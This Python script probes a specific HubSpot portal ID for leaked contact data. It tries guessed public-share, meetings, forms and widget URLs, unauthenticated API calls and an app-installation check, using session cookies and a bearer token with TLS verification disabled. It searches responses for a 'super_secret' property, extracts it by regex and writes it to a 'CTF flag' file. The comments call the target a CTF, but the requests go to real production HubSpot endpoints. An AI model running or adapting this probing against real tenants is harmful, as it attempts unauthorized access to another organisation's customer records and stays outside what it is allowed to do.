#!/usr/bin/env python3
"""
Final check - look for public sharing / collaboration features
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("Final Public/Shared Access Check")
print("="*80)
print("\nChecking if portal 46962361 has any public/shared resources...")
print("="*80)

headers_session = {
    'Cookie': SESSION_COOKIES,
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
}

headers_token = {
    'Authorization': f'Bearer {ACCESS_TOKEN}',
    'Content-Type': 'application/json',
}

# ============================================================================
# CHECK FOR PUBLIC SHARING
# ============================================================================

print("\n[*] Checking for publicly shared contact views...")

public_share_urls = [
    # Public sharing links
    f'https://share.hubspot.com/contacts/{TARGET_PORTAL}/1',
    f'https://public.hubspot.com/contacts/{TARGET_PORTAL}/1',

    # Meeting/booking pages (sometimes expose contact data)
    f'https://meetings.hubspot.com/{TARGET_PORTAL}',
    f'https://meetings.hubspot.com/{TARGET_PORTAL}/1',

    # Public forms (might have contact data in responses)
    f'https://forms.hubspot.com/{TARGET_PORTAL}',

    # Public pages/sites
    f'https://{TARGET_PORTAL}.hs-sites.com',
    f'https://{TARGET_PORTAL}.hubspotpagebuilder.com',

    # CTA/tracking links
    f'https://cta-redirect.hubspot.com/cta/redirect/{TARGET_PORTAL}/1',

    # Knowledge base
    f'https://knowledge.hubspot.com/{TARGET_PORTAL}',
]

for url in public_share_urls:
    try:
        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"\n  Found: {url}")

            # Check for contact data
            if any(term in r.text.lower() for term in ['firstname', 'super_secret', 'email', 'contact']):
                print(f"  Contains contact-related data!")
                print(f"  Length: {len(r.text)} bytes")

                if 'super_secret' in r.text.lower():
                    print(f"\n  *** SUPER_SECRET FOUND IN PUBLIC PAGE! ***")
                    print(f"  URL: {url}")

                    # Try to extract the value
                    import re
                    matches = re.findall(r'super_secret["\']?\s*[:=]\s*["\']([^"\'<>]+)["\']', r.text, re.I)
                    if matches:
                        print(f"  Value: {matches[0]}")

                        with open('/home/user/Hub/findings/PUBLIC_CTF_FLAG.txt', 'w') as f:
                            f.write(f"URL: {url}\n")
                            f.write(f"super_secret: {matches[0]}\n")
    except:
        pass

# ============================================================================
# CHECK IF TARGET PORTAL HAS PUBLIC API ACCESS
# ============================================================================

print("\n[*] Checking for public API endpoints...")

# Some portals might have public API access enabled
public_api_urls = [
    f'https://api.hubapi.com/contacts/v1/contact/vid/1',  # No portalId
    f'https://api.hubapi.com/contacts/v1/contact/email/test@example.com/profile',
]

for url in public_api_urls:
    try:
        # Try without ANY authentication
        r = requests.get(url, headers={}, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"\n  Public API access: {url}")
            try:
                data = r.json()
                if 'properties' in str(data):
                    print(f"  Got contact data!")
                    print(json.dumps(data, indent=2)[:300])
            except:
                pass
    except:
        pass

# ============================================================================
# CHECK FOR EMBEDDED CONTACT WIDGETS
# ============================================================================

print("\n[*] Checking for embedded contact widgets...")

# HubSpot allows embedding contact info widgets
widget_urls = [
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1/embed',
    f'https://app.hubspot.com/widgets/{TARGET_PORTAL}/contact/1',
]

for url in widget_urls:
    try:
        r = requests.get(url, headers=headers_session, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"  Found widget: {url}")
            if 'super_secret' in r.text.lower():
                print(f"  *** Contains super_secret! ***")
    except:
        pass

# ============================================================================
# TRY OAUTH APP INSTALLATION CHECK
# ============================================================================

print("\n[*] Checking if our app is actually installed on target portal...")

try:
    # Try to get install info
    r = requests.get(
        f'https://api.hubapi.com/integrations/v1/{TARGET_PORTAL}/installed',
        headers=headers_token,
        verify=False,
        timeout=5
    )

    print(f"\nApp installation check: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        print(json.dumps(data, indent=2))

        if data.get('installed'):
            print("\n*** OUR APP IS INSTALLED ON TARGET PORTAL! ***")
            print("This means we SHOULD have access. Retrying data access...")

            # Try contact access again
            contact_url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}'
            r2 = requests.get(contact_url, headers=headers_token, verify=False, timeout=5)

            print(f"Contact access: {r2.status_code}")
            if r2.status_code == 200:
                print("*** SUCCESS! ***")
                print(r2.text)
except Exception as e:
    print(f"Error: {e}")

# ============================================================================
# CHECK FOR DEMO/SANDBOX PORTAL
# ============================================================================

print("\n[*] Checking if portal 46962361 is a demo/sandbox...")

# Demo portals sometimes have relaxed security
demo_checks = [
    'https://developers.hubspot.com/demo-portal/46962361',
    f'https://api.hubapi.com/crm/v3/objects/contacts?limit=1',  # List contacts without portal ID
]

for url in demo_checks:
    try:
        r = requests.get(url, headers=headers_token, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"\nGot response from: {url}")
            try:
                data = r.json()

                # Check if any contacts are from target portal
                if 'results' in data:
                    for contact in data.get('results', []):
                        contact_url = contact.get('url', '')
                        if TARGET_PORTAL in contact_url:
                            print(f"*** FOUND TARGET PORTAL CONTACT IN RESULTS! ***")
                            print(json.dumps(contact, indent=2))
            except:
                pass
    except:
        pass

print("\n" + "="*80)
print("Public/Shared Access Check Complete")
print("="*80)
print("\nCONCLUSION:")
print("If no public access found, the CTF likely requires:")
print("1. Finding a novel authorization bypass vulnerability")
print("2. OR getting legitimate access to portal 46962361")
print("3. OR the challenge demonstrates that security works correctly")
print("="*80)
